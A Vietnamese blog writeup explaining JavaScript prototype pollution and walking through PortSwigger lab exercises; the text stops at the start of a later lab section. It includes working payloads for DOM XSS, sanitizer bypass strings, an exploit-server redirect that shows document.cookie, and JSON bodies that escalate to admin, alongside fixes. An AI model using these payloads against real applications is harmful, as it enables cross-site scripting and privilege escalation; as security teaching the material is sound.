---
title: "Tản mạn về Prototype Pollution"
description: "Từ Object, Prototype và prototype chain đến DOM XSS, leo quyền và RCE qua 9 bài lab Prototype Pollution trên PortSwigger."
date: 2026-10-29 10:00:00 +0700
categories: [Web Security, PortSwigger Labs]
tags: [prototype-pollution, javascript, web-exploitation, portswigger, writeup]
toc: true
media_subpath: /assets/img/posts/2026-10-29-prototype-pollution
pin: false
---

## I. Prototype Pollution là gì?

Nếu HTTP Request Smuggling là **buôn lậu request** thì Prototype Pollution có thể hiểu là **làm ô nhiễm nguyên mẫu** 🤔. Nghe hơi trừu tượng, nhưng ý tưởng của nó khá thú vị: thay vì sửa trực tiếp từng object, attacker tìm cách sửa object mà nhiều object khác đang kế thừa thuộc tính từ đó.

Giả sử ứng dụng kiểm tra quyền bằng `user.isAdmin`. Mình không sửa được trực tiếp thông tin của user, nhưng nếu `user` chưa có thuộc tính riêng `isAdmin`, JavaScript sẽ tìm tiếp trên prototype của nó. Nếu attacker kiểm soát được giá trị ở đó thì kết quả kiểm tra quyền có thể thay đổi.

Đó chính là vấn đề của **Prototype Pollution**: dữ liệu do người dùng kiểm soát đi qua một đoạn code xử lý object không an toàn, khiến attacker thêm hoặc sửa thuộc tính trên prototype. Những đoạn code khác vô tình đọc giá trị này và có thể dẫn đến DOM XSS, vượt quyền hoặc thậm chí RCE.

Trong bài này mình đi từ các ghi chú về Object và Prototype, sau đó phân tích lần lượt 9 bài lab trên PortSwigger: 5 bài client-side và 4 bài server-side. Các payload khai thác bên dưới được đặt trong ngữ cảnh những bài lab này.

---

## II. Một chút JavaScript trước khi bắt đầu

### 1. Object và Prototype

JavaScript sử dụng cơ chế kế thừa dựa trên **prototype**. Một object có thể chứa các cặp `key: value`, trong đó value cũng có thể là một function:

```javascript
const user = {
  name: "Nam",
  sayHello() {
    return `Hello ${this.name}`;
  }
};

console.log(user.name);       // Nam
console.log(user.sayHello()); // Hello Nam
```

Ngoài các thuộc tính của chính nó, object thông thường còn liên kết với một object khác gọi là **prototype**. Khi không tìm thấy thuộc tính trên object hiện tại, JavaScript sẽ tiếp tục tìm ở prototype.

![Sơ đồ khái quát về quan hệ kế thừa giữa các kiểu dữ liệu trong JavaScript](object-prototype.png)
_Hình khái quát trong ghi chú: các kiểu dữ liệu có quan hệ kế thừa qua prototype. Để theo dõi chính xác chiều tra cứu thuộc tính, xem prototype chain của mảng ở phần dưới._

Ví dụ, mình không khai báo `toString()` trong object trên nhưng vẫn gọi được:

```javascript
console.log(user.toString()); // [object Object]
console.log(Object.getPrototypeOf(user) === Object.prototype); // true
```

Ở đây, `toString()` được tìm thấy trên `Object.prototype`.

Một điểm cần phân biệt: string, number, boolean là các **primitive**, không phải object. Tuy nhiên JavaScript có thể tạm bọc chúng để truy cập các phương thức như `"hello".toUpperCase()`. Array và function thì là object. Cú pháp `class` trong JavaScript cũng hoạt động trên cơ chế prototype.

### 2. Prototype chain

Quá trình tìm thuộc tính diễn ra theo thứ tự:

1. Tìm trên chính object hiện tại.
2. Nếu không có, tìm trên prototype của nó.
3. Tiếp tục đi lên cho đến khi tìm thấy thuộc tính hoặc gặp `null`.
4. Nếu hết chuỗi vẫn không có thì trả về `undefined`.

Ví dụ với một mảng:

```text
const items = [];

items
  │ [[Prototype]]
  ▼
Array.prototype
  │ [[Prototype]]
  ▼
Object.prototype
  │ [[Prototype]]
  ▼
null
```

Đây là **prototype chain**. `Object.prototype` nằm gần cuối chuỗi của rất nhiều object thông thường, nên việc sửa nó có thể ảnh hưởng đến nhiều chỗ trong cùng môi trường JavaScript.

```javascript
const user = { name: "Nam" };
Object.prototype.labMarker = "polluted";

console.log(user.labMarker); // polluted
console.log(({}).labMarker); // polluted
console.log(Object.hasOwn(user, "labMarker")); // false

delete Object.prototype.labMarker;
```

`user` không được thêm một thuộc tính riêng nào cả. Khi đọc `user.labMarker`, JavaScript tìm thấy giá trị trên prototype. Cả object đã tồn tại trước lúc pollution cũng có thể chịu ảnh hưởng, miễn là chúng đi qua prototype đó khi tra cứu.

Tuy nhiên, **thuộc tính riêng sẽ được ưu tiên**:

```javascript
Object.prototype.isAdmin = true;

const userA = { name: "A" };
const userB = { name: "B", isAdmin: false };

console.log(userA.isAdmin); // true: lấy từ prototype
console.log(userB.isAdmin); // false: lấy từ chính userB

delete Object.prototype.isAdmin;
```

Vậy nên không phải cứ pollute `isAdmin` là tất cả user tự động thành admin. Còn phải xem ứng dụng lưu và đọc thuộc tính đó như thế nào.

### 3. `__proto__`, `.prototype` và `constructor`

Ba cái tên này xuất hiện liên tục trong payload, nhưng chúng có vai trò khác nhau:

| Thành phần | Ý nghĩa |
| --- | --- |
| `[[Prototype]]` | Liên kết nội bộ từ một object đến prototype của nó. |
| `obj.__proto__` | Accessor kế thừa từ `Object.prototype`, thường dùng để đọc hoặc đổi prototype của object thông thường. |
| `Constructor.prototype` | Object được dùng làm prototype cho các instance tạo bằng constructor đó trong trường hợp thông thường. |
| `obj.constructor` | Thuộc tính thường được kế thừa, tham chiếu đến constructor; có thể bị ghi đè và không phải lúc nào cũng tồn tại. |

Với object literal thông thường:

```javascript
const obj = {};

console.log(obj.__proto__ === Object.prototype);             // true
console.log(obj.constructor === Object);                    // true
console.log(obj.constructor.prototype === Object.prototype); // true
```

Vì vậy, trong trường hợp này, attacker có hai đường để tiếp cận `Object.prototype`:

```text
obj → __proto__ → Object.prototype
obj → constructor → prototype → Object.prototype
```

Đây cũng là lý do chỉ chặn chuỗi `__proto__` chưa chắc đã đủ. Nhưng đừng hiểu rằng `constructor.prototype` luôn tương đương `__proto__` với mọi object: object tạo bằng `Object.create(null)`, object có constructor riêng hoặc constructor bị ghi đè là những trường hợp khác.

---

## III. Lỗ hổng bắt nguồn từ đâu?

### 1. Ghi thuộc tính động và xử lý đường dẫn không an toàn

Giả sử ứng dụng muốn chuyển query string sau thành object:

```text
?user[name]=Nam

→ { user: { name: "Nam" } }
```

Một parser hỗ trợ object lồng nhau sẽ tách đường dẫn thành `user`, `name`, rồi lần lượt đi vào từng tầng để gán giá trị. Nếu không kiểm tra tên thuộc tính, attacker có thể thay bằng:

```text
?__proto__[isAdmin]=true
```

Với parser có lỗ hổng, thao tác cuối cùng có thể tương đương:

```javascript
const target = {};
target["__proto__"]["isAdmin"] = "true";

console.log(({}).isAdmin); // "true"
delete Object.prototype.isAdmin;
```

`target["__proto__"]` trả về prototype của `target`, ở đây là `Object.prototype`. Thế là lần gán tiếp theo đã ghi vào prototype chung.

Chú ý `"true"` ở ví dụ query string là **chuỗi**, còn `true` trong JSON là **boolean**. Điều này có thể ảnh hưởng đến kiểm tra kiểu dữ liệu khi khai thác.

Ngoài ra, bản thân URL không có khả năng sửa prototype. Phải có code đọc URL và xử lý đường dẫn không an toàn. `URLSearchParams` thông thường chỉ đọc tên và giá trị tham số, không tự biến ngoặc vuông thành object lồng nhau.

### 2. Payload JSON và deep merge

Một nguồn khác là JSON gửi đến API cập nhật dữ liệu:

```json
{
  "__proto__": {
    "labMarker": "polluted"
  }
}
```

`JSON.parse()` chỉ tạo ra một **own property** có tên `__proto__`. Chưa có chuyện tự động sửa `Object.prototype`:

```javascript
const input = JSON.parse('{"__proto__":{"labMarker":"polluted"}}');

console.log(Object.hasOwn(input, "__proto__")); // true
console.log(({}).labMarker);                   // undefined
```

Vấn đề xuất hiện khi dữ liệu này chạm vào hàm merge không an toàn. Đây là ví dụ rút gọn để nhìn rõ cơ chế, không phải hàm merge nên dùng trong ứng dụng:

```javascript
function unsafeMerge(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];

    if (value !== null && typeof value === "object") {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}

const input = JSON.parse('{"__proto__":{"labMarker":"polluted"}}');
unsafeMerge({}, input);

console.log(({}).labMarker); // polluted
delete Object.prototype.labMarker;
```

Phân tích từng bước:

1. `key` nhận giá trị `__proto__`, còn `value` là một object.
2. `target[key]` trả về `Object.prototype`, là một giá trị truthy nên code không tạo object mới.
3. Hàm gọi tiếp `unsafeMerge(Object.prototype, { labMarker: "polluted" })`.
4. Ở lần đệ quy này, `target.labMarker = "polluted"` chính là ghi vào `Object.prototype`.

Mình cố tình dùng `Object.keys()` trong ví dụ để thấy rằng **đổi vòng lặp thôi chưa đủ**. Code vẫn có thể đọc thuộc tính kế thừa từ `target` và đi vào prototype.

Một lưu ý nữa: object literal `const obj = { __proto__: {...} }` có cú pháp đặc biệt để đặt prototype, khác với object được tạo từ `JSON.parse()`. Khi tự dựng PoC cho payload JSON, nên dùng `JSON.parse()` để tái hiện đúng dữ liệu server nhận được.

### 3. Đổi prototype của một object khác với pollute prototype chung

Không phải mọi thao tác với `__proto__` đều có tác động giống nhau:

```javascript
const input = JSON.parse('{"__proto__":{"labMarker":"local"}}');
const target = Object.assign({}, input);

console.log(target.labMarker); // local
console.log(({}).labMarker);   // undefined
```

Trong trường hợp này, `Object.assign()` kích hoạt setter `__proto__` trên target và đổi prototype của **target**, chứ không thêm `labMarker` vào `Object.prototype`. Vẫn có thể gây vấn đề nếu target là object cấu hình quan trọng, nhưng phạm vi khác với deep merge ở trên.

Object spread `{ ...input }` không kích hoạt setter theo cách đó. Tuy nhiên, nếu sau này tiếp tục đưa kết quả vào một hàm deep merge có lỗ hổng thì nguy cơ vẫn còn. Có thể đọc thêm về sự khác biệt này trong [tài liệu Prototype Pollution của MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

### 4. Source, Gadget và Sink

Pollute được một thuộc tính vô nghĩa chưa đủ để có một exploit hoàn chỉnh. Mình cần tìm đoạn code thực sự sử dụng nó:

```text
Source                    Pollution             Gadget             Sink
URL / JSON / message  →   ghi vào prototype  →   đọc thuộc tính  →   hành vi nguy hiểm
```

| Thành phần | Vai trò | Ví dụ trong các lab |
| --- | --- | --- |
| Source | Đường vào từ dữ liệu attacker kiểm soát đến thao tác ghi prototype. | Parser query string, parser fragment, deep merge JSON. |
| Gadget | Đoạn code đọc thuộc tính bị pollution và đưa nó vào luồng xử lý có ích cho attacker. | `config.transport_url`, `manager.sequence`, descriptor thiếu `value`. |
| Sink | Nơi dữ liệu tạo ra tác động cuối cùng. | `script.src`, `eval()`, `setTimeout()` nhận chuỗi, thực thi tiến trình con. |

Ví dụ:

```javascript
const config = {};
const script = document.createElement("script");

if (config.transport_url) {
  script.src = config.transport_url;
  document.body.appendChild(script);
}
```

Nếu attacker pollute được `Object.prototype.transport_url`, object `config` sẽ đọc giá trị kế thừa đó. Từ một lỗi xử lý object, mình đã điều khiển được nguồn script mà trang tải vào.

---

## IV. Client-side Prototype Pollution

Ở phía client, source thường nằm trong query string, fragment sau dấu `#`, hoặc dữ liệu JSON được JavaScript xử lý. Mình có thể dùng DevTools để đọc code, đặt breakpoint và kiểm tra prototype trực tiếp.

Một quy trình thủ công khá dễ nhớ:

1. Thử pollute thuộc tính đánh dấu, ví dụ `?__proto__[labMarker]=ntran`.
2. Kiểm tra `Object.prototype.labMarker` và `({}).labMarker` trong Console.
3. Nếu chưa được, đổi cú pháp sang dấu chấm hoặc đường `constructor.prototype` phù hợp với parser.
4. Đọc code để tìm thuộc tính cấu hình chưa có own property và theo dõi nó đến sink.
5. Ghép source với gadget, rồi kiểm tra lại bằng URL hoàn chỉnh trong một trang mới.

Tự gán `Object.prototype.foo = "bar"` trong Console chỉ giúp thử gadget. Muốn chứng minh source có lỗ hổng thì thuộc tính phải được tạo ra từ dữ liệu đầu vào của trang.

### 1. Lab: Client-side prototype pollution via browser APIs

**Link Lab:** [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)

Mục tiêu là tìm source, tìm gadget và gọi được `alert()`. Điểm thú vị nằm ở chỗ developer đã nhận ra một gadget và cố khóa nó lại.

Trong `searchLoggerConfigurable.js`, phần cấu hình có dạng:

```javascript
let config = {
  params: deparam(new URL(location).searchParams.toString()),
  transport_url: false
};

Object.defineProperty(config, "transport_url", {
  configurable: false,
  writable: false
});
```

`transport_url` là một own property có giá trị `false`, nên pollute trực tiếp thuộc tính này trên `Object.prototype` sẽ không thắng được nó. Sau đó developer còn đặt `writable: false` và `configurable: false` để hạn chế sửa đổi.

Nghe có vẻ ổn rồi, nhưng object thứ ba truyền vào `Object.defineProperty()` cũng là một object bình thường. Nó được gọi là **property descriptor**.

#### Property descriptor có gì?

| Thuộc tính | Ý nghĩa |
| --- | --- |
| `value` | Giá trị của data property. |
| `writable` | Cho phép thay đổi giá trị bằng phép gán hay không. |
| `get`, `set` | Getter và setter của accessor property; không dùng chung với `value` hoặc `writable` trong cùng descriptor. |
| `enumerable` | Thuộc tính có xuất hiện khi duyệt bằng `Object.keys()` hoặc `for...in` hay không. |
| `configurable` | Cho phép xóa và thay đổi các đặc tính của property trong giới hạn quy định hay không. |

Khi tạo property mới bằng `defineProperty()`, các cờ bị bỏ trống mặc định là `false`, còn `value` mặc định là `undefined`. Với property đã tồn tại, trường descriptor thực sự vắng mặt thường giữ nguyên đặc tính cũ. Nhưng **một trường được kế thừa vẫn có thể được đọc khi JavaScript xử lý descriptor**. Xem [mô tả của MDN về `Object.defineProperty()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty).

Vậy nếu pollute `value`, descriptor trên sẽ đọc được giá trị từ prototype và dùng nó để cập nhật `config.transport_url`, ngay trong lần gọi đang khóa property đó lại.

#### Payload

Trước tiên kiểm tra source:

```text
/?__proto__[labMarker]=ntran
```

Trong Console:

```javascript
Object.prototype.labMarker // "ntran"
```

Sau đó thay sang gadget `value`:

```text
/?__proto__[value]=data:,alert(1);
```

Luồng khai thác:

```text
deparam() xử lý query string
  → Object.prototype.value = "data:,alert(1);"
  → descriptor kế thừa value
  → defineProperty() đặt config.transport_url thành payload
  → script.src nhận URL do attacker kiểm soát
  → alert(1)
```

`data:,alert(1);` chứa nội dung JavaScript ngay trong URL. Payload này hoạt động trong điều kiện của lab; với website thực tế còn phải xét CSP và chính sách tải script.

#### Sửa thế nào?

Với đoạn code trên, đặt `value: false` trực tiếp sẽ chặn đường kế thừa `value`. Có thể làm chặt hơn bằng descriptor không có prototype:

```javascript
const descriptor = Object.create(null);
descriptor.value = false;
descriptor.writable = false;
descriptor.configurable = false;

Object.defineProperty(config, "transport_url", descriptor);
```

Điều này bảo vệ đoạn cấu hình đó; source `deparam()` vẫn cần được sửa riêng.

### 2. Lab: DOM XSS via client-side prototype pollution

**Link Lab:** [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

Lab này cho thấy rõ hơn gadget `transport_url`. Trong `searchLogger.js`, ứng dụng lấy tham số URL và truyền vào `deparam()`:

```javascript
let config = {
  params: deparam(new URL(location).searchParams.toString())
};
```

Parser hỗ trợ key lồng nhau bằng ngoặc vuông. Logic quan trọng có thể rút gọn như sau:

```javascript
// Minh họa cách parser đi qua từng thành phần của đường dẫn.
cur = cur[key] = i < keys_last
  ? cur[key] || (keys[i + 1] && isNaN(keys[i + 1]) ? {} : [])
  : val;
```

Với `__proto__[labMarker]=ntran`, đường dẫn được tách thành `['__proto__', 'labMarker']`:

1. Vòng đầu, `cur` đang là object kết quả. Đọc `cur['__proto__']` trả về `Object.prototype`, nên code đi tiếp vào object này.
2. Vòng sau, phép gán `cur['labMarker'] = 'ntran'` ghi vào `Object.prototype`.

Sau khi xác nhận marker bằng Console, tìm đoạn code dùng `config.transport_url` để tạo thẻ `<script>`. Khác bài trước, ở đây `config` không có own property `transport_url`, nên có thể nhắm trực tiếp vào nó:

```text
/?__proto__[transport_url]=data:,alert(1);
```

Để quan sát từng bước, có thể thử giá trị `foo` trước:

```text
/?__proto__[transport_url]=foo
```

Sang tab Elements sẽ thấy thẻ script có `src="foo"`. Như vậy source đã nối được đến sink, chỉ còn thay nội dung thành PoC XSS.

Hai bài đầu nhìn khá giống nhau, nhưng gadget khác nhau: bài browser APIs đi qua **`value` của descriptor**, còn bài này đi thẳng qua **`transport_url` của config**.

### 3. Lab: DOM XSS via an alternative prototype pollution vector

**Link Lab:** [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)

Ở bài này, parser thay đổi. Thử ngoặc vuông không tạo được thuộc tính mong muốn, nhưng cú pháp dấu chấm lại có tác dụng:

```text
/?__proto__.labMarker=ntran
```

Trong hàm đệ quy `createElement()`, nhánh xử lý dấu chấm có đoạn:

```javascript
if (key.indexOf(".") !== -1) {
  var list = key.split(".");
  var new_key = key.split(/\.(.+)?/)[1];

  if (!params[list[0]]) params[list[0]] = {};

  if (new_key !== "") {
    createElement(params[list[0]], new_key, value);
  }
}
```

Nếu `list[0]` là `__proto__`, `params[list[0]]` đã trả về một object truthy. Code bỏ qua việc tạo object mới rồi truyền thẳng prototype vào lần đệ quy sau.

Source đã có, giờ tìm sink. Trong `searchLoggerAlternative.js` xuất hiện:

```javascript
window.macros = {};
window.manager = {
  params: $.parseParams(new URL(location)),
  macro(property) {
    if (window.macros.hasOwnProperty(property)) {
      return macros[property];
    }
  }
};

let a = manager.sequence || 1;
manager.sequence = a + 1;

eval('if(manager && manager.sequence){ manager.macro(' + manager.sequence + ') }');
```

`manager` chưa có own property `sequence` khi đọc lần đầu. Mình có thể đưa một chuỗi từ prototype vào đây, rồi chuỗi đó bị nối vào code truyền cho `eval()`.

Nhưng thử ngay payload này thì chưa chạy được:

```text
/?__proto__.sequence=alert(1)
```

Tại sao? Vì có phép cộng `a + 1`. `a` là chuỗi nên JavaScript thực hiện **nối chuỗi**:

```javascript
"alert(1)" + 1 // "alert(1)1"
```

Đến sink, đoạn code thành:

```javascript
if(manager && manager.sequence){ manager.macro(alert(1)1) }
```

Cú pháp không hợp lệ nên `eval()` không thực thi. Đặt breakpoint ngay tại sink sẽ nhìn thấy giá trị `manager.sequence` bị thêm số `1` ở cuối.

Một cách sửa rất gọn là thêm dấu trừ:

```text
/?__proto__.sequence=alert(1)-
```

Lúc này code được tạo ra là:

```javascript
if(manager && manager.sequence){ manager.macro(alert(1)-1) }
```

`alert(1)` được gọi khi JavaScript tính đối số cho `manager.macro()`. Giá trị cuối của phép trừ không quan trọng với mục tiêu lab.

Trong ghi chú của mình còn một cách khác là đóng lời gọi hàm, đóng block rồi comment phần đuôi:

```text
/?__proto__.sequence=1)};alert(1);//
```

Sau khi bị nối thêm `1`, chuỗi truyền vào `eval()` sẽ có dạng:

```javascript
if(manager && manager.sequence){ manager.macro(1)};alert(1);//1) }
```

Điểm cần nhớ ở bài này là phải xem **chuỗi cuối cùng tại sink**, vì payload còn có thể bị biến đổi trước lúc thực thi.

### 4. Lab: Client-side prototype pollution via flawed sanitization

**Link Lab:** [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)

Vẫn là mục tiêu gọi `alert()` qua client-side pollution, nhưng lần này code đã có hàm lọc key:

```javascript
function sanitizeKey(key) {
  let badProperties = ["constructor", "__proto__", "prototype"];

  for (let badProperty of badProperties) {
    key = key.replaceAll(badProperty, "");
  }

  return key;
}
```

Hàm này nằm trong JavaScript phía client. Vấn đề là nó **xóa chuỗi cấm rồi tiếp tục dùng kết quả**, trong khi kết quả mới có thể lại trở thành một chuỗi cấm.

Ví dụ:

```javascript
"__pro__proto__to__".replaceAll("__proto__", "")
// "__proto__"
```

`replaceAll()` xóa các lần khớp trong đầu vào của lần gọi đó, không lặp lại mãi trên chuỗi vừa tạo ra. Ghép phần `__pro` với `to__` còn lại sẽ tái tạo đúng `__proto__`.

Vậy thử source:

```text
/?__pro__proto__to__[labMarker]=ntran
```

Nếu Console xác nhận `Object.prototype.labMarker === "ntran"`, chuyển sang gadget `transport_url` giống bài trước:

```text
/?__pro__proto__to__[transport_url]=data:,alert(1);
```

Các dạng khác có trong ghi chú:

```text
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

Những dạng này vẫn phụ thuộc cú pháp parser hỗ trợ. Không thể lấy mọi payload dấu chấm, ngoặc vuông rồi thay thế lẫn nhau trong tất cả ứng dụng.

Cách sửa hợp lý hơn là **từ chối đường dẫn không hợp lệ** và kiểm tra từng thành phần sau khi parse, thay vì xóa một đoạn rồi dùng tiếp chuỗi đã biến đổi.

### 5. Lab: Client-side prototype pollution in third-party libraries

**Link Lab:** [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

Với các thư viện bên thứ ba, code có thể đã minify nên tìm gadget thủ công khá mất thời gian. Bài này mình dùng **DOM Invader** trong trình duyệt tích hợp của Burp:

1. Bật DOM Invader và tùy chọn kiểm tra Prototype Pollution trong extension.
2. Vào homepage của lab, mở DevTools → DOM Invader rồi reload.
3. Công cụ phát hiện source trong `location.hash`, tức phần sau dấu `#`.
4. Chọn **Scan for gadgets**. Một tab mới sẽ mở để quét.
5. Khi quét xong, mở DevTools → DOM Invader ngay trong tab đó để xem kết quả.
6. Kiểm tra gadget `hitCallback` đi đến sink `setTimeout()`, rồi dùng **Exploit** để thử PoC.

`setTimeout()` có thể nhận function hoặc chuỗi. Trong trường hợp gadget này, dữ liệu đi đến dạng chuỗi và được xử lý như JavaScript.

Sau khi kiểm tra, tắt DOM Invader để xác nhận payload chạy độc lập. Trên exploit server của lab, đặt body:

```html
<script>
  location = "https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29";
</script>
```

Thay `YOUR-LAB-ID` bằng ID lab đang làm, test trên chính trình duyệt của mình rồi gửi cho victim bằng chức năng của exploit server.

Phần `%28` và `%29` là dấu ngoặc được URL encode. Fragment không được gửi trong HTTP request ban đầu đến server, nhưng JavaScript phía trang vẫn đọc được và truyền vào parser có lỗ hổng.

Ở đây chỉ cần hiển thị `document.cookie` để giải lab. Payload chạy được trên trình duyệt của mình chưa đủ; phải kiểm tra luồng chuyển hướng khiến nó chạy trong trình duyệt victim.

---

## V. Server-side Prototype Pollution

### 1. Điểm khác so với client-side

Nguyên lý vẫn là ghi vào prototype rồi tìm gadget, nhưng phía server thường không có source code hoặc Console để kiểm tra trực tiếp. Mình phải suy ra từ response và thay đổi hành vi.

Một điều cần nhớ khi làm các lab này: pollution có thể tồn tại suốt vòng đời tiến trình Node.js. Reload trình duyệt không làm server sạch lại. Trong hệ thống nhiều worker, các request còn có thể đi vào những process khác nhau nên kết quả không phải lúc nào cũng đồng nhất.

### 2. Property reflection và vòng lặp `for...in`

`for...in` duyệt cả các thuộc tính enumerable kế thừa từ prototype:

```javascript
Object.prototype.labMarker = "ntran";
const user = { name: "Nam" };

for (const key in user) {
  console.log(key); // name, labMarker
}

console.log(Object.keys(user)); // ["name"]
console.log(JSON.stringify(user)); // {"name":"Nam"}

delete Object.prototype.labMarker;
```

Nếu server dùng `for...in` để sao chép thuộc tính vào object response, marker kế thừa có thể xuất hiện trong JSON trả về. **`JSON.stringify()` thông thường không tự serialize các thuộc tính kế thừa**; phải có thêm hành vi của ứng dụng khiến chúng được đưa vào dữ liệu xuất ra.

Để chỉ duyệt own properties, có thể dùng `for...of` trên `Object.keys(obj)` hoặc `Object.entries(obj)`. Chỉ nói “đổi sang `for...of`” thì chưa đủ, vì object thường không iterable.

### 3. Lab: Privilege escalation via server-side prototype pollution

**Link Lab:** [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)

![Đề bài yêu cầu tìm source, leo quyền admin và xóa tài khoản carlos](lab-privilege-escalation.png)

Mục tiêu là leo quyền admin và xóa tài khoản `carlos`. Đăng nhập bằng `wiener:peter`, cập nhật địa chỉ rồi tìm request trong Burp HTTP history:

```http
POST /my-account/change-address HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
```

Body có dạng:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "YOUR-SESSION-ID"
}
```

Gửi request sang Repeater. Giữ nguyên các trường và session của request đang dùng, thêm thuộc tính này vào JSON body:

```json
"__proto__": {
  "labMarker": "ntran"
}
```

Các đoạn JSON dạng fragment trong phần lab là **thuộc tính thêm vào object body hiện có**, cần đặt dấu phẩy đúng vị trí.

Response có marker nhưng không giữ nguyên lớp `__proto__` là dấu hiệu phù hợp với việc dữ liệu đã đi qua prototype và được ứng dụng đưa ra response. Nó mạnh hơn việc server đơn giản echo nguyên payload; khi kiểm thử black-box vẫn cần đối chiếu thêm hành vi để xác định phạm vi pollution.

Trong response còn có trường `isAdmin: false`. Thay marker bằng:

```json
"__proto__": {
  "isAdmin": true
}
```

Gửi lại, reload trang tài khoản, vào admin panel và xóa `carlos` theo yêu cầu lab.

#### Vì sao response ban đầu có `isAdmin: false` mà vẫn đổi được?

JSON response không cho mình biết `isAdmin` là own property hay là giá trị được ứng dụng lấy từ prototype rồi đưa vào response. Với lab này, kết quả khai thác phù hợp với việc object liên quan đến kiểm tra quyền đọc giá trị kế thừa.

Nếu object thực sự có own property `isAdmin: false`, thì chỉ sửa `Object.prototype.isAdmin = true` sẽ không ghi đè nó, như ví dụ ở phần II.

Còn chuyện gửi thẳng `"isAdmin": true` không hiệu quả có thể liên quan đến lọc trường đầu vào hoặc luồng cập nhật dữ liệu. Không có source backend thì mình không kết luận chính xác middleware nào đã xử lý nó; điều cần chứng minh là payload lồng qua prototype đã tác động được đến quyền.

### 4. Lab: Detecting server-side prototype pollution without polluted property reflection

**Link Lab:** [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)

Lab này vẫn có tính năng cập nhật địa chỉ, nhưng marker không xuất hiện trong response. Điều đó chưa chứng minh server an toàn: có thể prototype đã bị sửa nhưng code trả response chỉ duyệt own properties.

![Request cập nhật địa chỉ chứa __proto__ với marker nam:tran, nhưng response không phản chiếu marker](lab-detection-without-reflection.png)
_Trong ảnh, mình thử `"__proto__": {"nam": "tran"}`. Response vẫn trả thông tin user nhưng không có marker `nam`, nên cần tìm dấu hiệu qua thay đổi hành vi._

Mục tiêu của bài là xác nhận pollution bằng thay đổi hành vi, không cần leo quyền hay RCE. Trong ghi chú, mình dùng **status code override**.

#### Bước 1: Ghi nhận lỗi ban đầu

Từ request cập nhật địa chỉ, cố tình làm JSON sai cú pháp, ví dụ bỏ một dấu phẩy. Server trả HTTP `500 Internal Server Error`, nhưng error object trong body có dạng rút gọn:

```json
{
  "error": {
    "statusCode": 400,
    "status": 400,
    "type": "entity.parse.failed"
  }
}
```

Ở đây cần phân biệt **HTTP status ở status line** với **`status` trong JSON body**. Hai giá trị có thể khác nhau; mình đang theo dõi thuộc tính trong error object.

#### Bước 2: Gửi payload bằng JSON hợp lệ

Sửa lại JSON để server parse được, rồi thêm:

```json
"__proto__": {
  "status": 510
}
```

Phải gửi một request hợp lệ để payload có cơ hội đi đến hàm merge. Nếu để JSON lỗi ngay từ đầu thì bước parse có thể chặn request trước đó.

#### Bước 3: Kích hoạt lại cùng loại lỗi

Gửi lại request sai cú pháp giống bước 1. Nếu error object chuyển từ `400` sang `510`, đó là thay đổi hành vi cho thấy giá trị trên prototype đã được dùng.

Trong luồng lỗi được PortSwigger phân tích, logic quan trọng của `http-errors` có dạng:

```javascript
status = err.status || err.statusCode || status;
```

Ban đầu, parser cung cấp mã lỗi `400` cho tình huống JSON sai. Nếu các thuộc tính được đọc trên `err` chưa có giá trị, code dùng mã dự phòng đó. Sau pollution, `err.status` có thể được tìm thấy trên prototype với giá trị `510` và được ưu tiên.

Nên chọn mã khác biệt trong khoảng `400–599`. Giá trị ngoài khoảng có thể bị chuẩn hóa thành `500`, làm khó phân biệt kết quả.

#### Hai kỹ thuật khác trong ghi chú

| Kỹ thuật | Thuộc tính thêm vào `__proto__` | Dấu hiệu cần quan sát |
| --- | --- | --- |
| JSON spaces override | `"json spaces": 10` | Độ thụt lề trong response JSON thay đổi. Xem tab **Raw**, tránh bị chế độ Pretty tự định dạng. |
| Charset override | `"content-type": "application/json; charset=utf-7"` | Trong tổ hợp runtime/middleware bị ảnh hưởng, chuỗi UTF-7 ở request tiếp theo được decode khác baseline. |

Ví dụ với charset, gửi một trường địa chỉ chứa `+AGYAbwBv-` trước và sau pollution. Nếu ban đầu response giữ nguyên chuỗi này, còn sau đó chuyển thành `foo`, đó là dấu hiệu cần điều tra.

Trong cơ chế cũ được mô tả ở ghi chú, code xử lý header đọc nhầm thuộc tính `content-type` kế thừa và có thể bỏ qua giá trị header thật; middleware sau đó dùng charset do attacker cung cấp. Cả charset override và JSON spaces override đều phụ thuộc phiên bản, không áp dụng cho mọi ứng dụng Node.js/Express. Các kỹ thuật này được giải thích trong [tài liệu server-side Prototype Pollution của PortSwigger](https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection).

### 5. Lab: Bypassing flawed input filters for server-side prototype pollution

**Link Lab:** [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)

Mục tiêu tiếp tục là leo quyền và xóa `carlos`. Nhưng lần này gửi payload `__proto__` không cho kết quả như bài trước.

